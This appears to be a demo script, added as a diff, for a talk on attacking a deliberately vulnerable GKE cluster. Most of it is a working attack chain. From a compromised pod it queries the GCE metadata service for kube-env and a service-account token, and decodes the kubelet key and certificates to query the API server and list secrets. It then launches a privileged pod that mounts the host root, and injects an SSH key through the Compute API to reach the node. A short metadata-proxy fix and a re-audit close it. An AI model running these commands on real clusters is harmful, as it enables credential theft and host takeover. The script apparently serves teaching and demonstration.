@@ -1,0 +1,127 @@
+---
+# Create cluster
+./kubeatf create-cluster gke-1.7.8-gce
+kubectl create -f vulnapp-dep.yml
+kubectl create -f azure-vote.yml
+
+---
+# Show and audit
+kubectl get nodes
+kubectl get pods --all-namespaces
+kubectl get pods -n default
+
+./kubeatf audit-cluster gke-1.7.8-gce | less
+
+---
+# Show failures
+curl -sk https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}
+
+curl -sLO https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl && chmod +x kubectl && mv kubectl /usr/local/bin
+
+kubectl get pods --all-namespaces
+
+curl -sk http://kubernetes-dashboard.kube-system
+
+curl -sk https://10.142.0.3:10250/runningpods/
+
+---
+kubectl exec -it vulnweb-2569941405-qgpg1 /bin/bash
+export TERM=xterm
+clear
+
+# Show access to user-data
+curl -s -H "X-Google-Metadata-Request: True" http://metadata.google.internal/0.1/meta-data/attributes/
+
+# Get kube-env
+curl -sLO https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl && chmod +x kubectl && mv kubectl /usr/local/bin && curl -s -H "X-Google-Metadata-Request: True" http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env | sed -e 's/^/export /g' | sed -e 's/: /=/g' | grep -v "EVICTION_HARD" | grep -v "EXTRA_DOCKER_OPTS" > kube-env.sh && . kube-env.sh && echo $KUBELET_KEY | base64 -d > client.pem && echo $KUBELET_CERT | base64 -d > client.crt && echo $CA_CERT | base64 -d > ca.crt && kubectl --certificate-authority=ca.crt --client-key=client.pem --client-certificate=client.crt --server https://$KUBERNETES_MASTER_NAME get pods --all-namespaces
+
+kubectl --certificate-authority=ca.crt --client-key=client.pem --client-certificate=client.crt --server https://$KUBERNETES_MASTER_NAME get pod kubernetes-dashboard-1265873680-06gs0 -n kube-system -o yaml
+
+kubectl --certificate-authority=ca.crt --client-key=client.pem --client-certificate=client.crt --server https://$KUBERNETES_MASTER_NAME get secret default-token-1kh92 -o yaml -n kube-system
+
+
+# Run privileged pod
+cat > masterpod.yml << EOF
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: nginx
+  namespace: kube-system
+spec:
+  hostNetwork: true
+  containers:
+  - name: nginx
+    image: nginx
+    securityContext:
+      privileged: true
+    volumeMounts:
+      - name: rootfs
+        mountPath: /rootfs
+  volumes:
+    - name: rootfs
+      hostPath:
+        path: /
+EOF
+
+# Gain node access
+kubectl --certificate-authority=ca.crt --client-key=client.pem --client-certificate=client.crt --server https://$KUBERNETES_MASTER_NAME apply -f masterpod.yml
+
+kubectl --certificate-authority=ca.crt --client-key=client.pem --client-certificate=client.crt --server https://$KUBERNETES_MASTER_NAME exec -it nginx -n kube-system /bin/bash
+
+kubectl --certificate-authority=ca.crt --client-key=client.pem --client-certificate=client.crt --server https://$KUBERNETES_MASTER_NAME get pod nginx -n kube-system
+
+kubectl --certificate-authority=ca.crt --client-key=client.pem --client-certificate=client.crt --server https://$KUBERNETES_MASTER_NAME get pod nginx -n kube-system | grep priv
+
+---
+kubectl exec -it vulnweb-2569941405-qgpg1 /bin/bash
+export TERM=xterm
+clear
+
+# Show meta-data credentials
+curl -s -H "X-Google-Metadata-Request: True" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Get instance IP
+curl -s -H "X-Google-Metadata-Request: True" http://metadata.google.internal/0.1/meta-data/network
+
+curl -s -H "Metadata-Flavor: Google" -H "Authorization":"Bearer $(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | awk -F\" '{print $4}')" -H "Accept: application/json" https://www.googleapis.com/compute/v1/projects/gkek8s-178117/zones/us-east1-b/instances
+
+curl -s -H "Metadata-Flavor: Google" -H "Authorization":"Bearer $(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | awk -F\" '{print $4}')" -H "Accept: application/json" https://www.googleapis.com/compute/v1/projects/gkek8s-178117/zones/us-east1-b/instances/gke-gke-1-7-8-gce-default-pool-77395b66-cncc | less
+
+export FINGERPRINT=$(curl -s -H "Metadata-Flavor: Google" -H "Authorization":"Bearer $(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | awk -F\" '{print $4}')" -H "Accept: application/json" https://www.googleapis.com/compute/v1/projects/gkek8s-178117/zones/us-east1-b/instances/gke-gke-1-7-8-gce-default-pool-77395b66-cncc | grep finger | tail -1 | cut -d'"' -f4)
+
+cat > metadata << EOF
+{ 
+  "fingerprint": "$FINGERPRINT",
+  "items": [
+   {
+    "key": "sshKeys",
+    "value": "geese:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYNealSvTy/g9aHyHTKe0xy2WIVmKPBqXVxmWyPObqfZJd0tWOw2JKoWb2m7V69haSa57SxF2f3Aap70BHhi+TjW//ZNHzE8jFyS/vf9e3CNSfFXlNY25cVbPc+b+EXl+pf96ubIt4WtnsoxuoZN06nC3UHeAWXIh8XJ6TakqjyTzy612ZmDQQuQ9qDjPaeGbJbzDytYdSxuSl5mTlG4hu87VsZlPHXXISfE7RPNSLQ3Kc+hfJkgEtGY/CexkIPgJTJBaI7znUyRtMeA/h5opdNMJlISZnVy5gQDwIaYRY73G+oWTh0cVH0cHRGhKYkIB+t8RHNyDA+EkLEObicbRF"
+   }
+  ]
+}
+
+EOF
+# Add SSH to node
+curl -X POST -d "@metadata" -s -H "Metadata-Flavor: Google" -H "Authorization":"Bearer $(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | awk -F\" '{print $4}')" -H "Content-type: application/json" https://www.googleapis.com/compute/v1/projects/gkek8s-178117/zones/us-east1-b/instances/gke-gke-1-7-8-gce-default-pool-77395b66-cncc/setMetadata
+
+# exit and SSH to node
+ssh -i ~/.ssh/kube.pem geese@35.185.32.11
+
+
+
+---
+# Fix GCE Metadata
+
+kubectl create -f gce-metadata-cf.yml
+kubectl create -f gce-metadata-proxy.yml
+
+kubectl exec -it vulnweb-2569941405-qgpg1 /bin/bash
+export TERM=xterm
+clear
+
+curl -s -H "X-Google-Metadata-Request: True" http://metadata.google.internal/0.1/meta-data/attributes/kube-env
+
+---
+# Audit cluster
+./kubeatf audit-cluster gke-1.7.8-gce | less
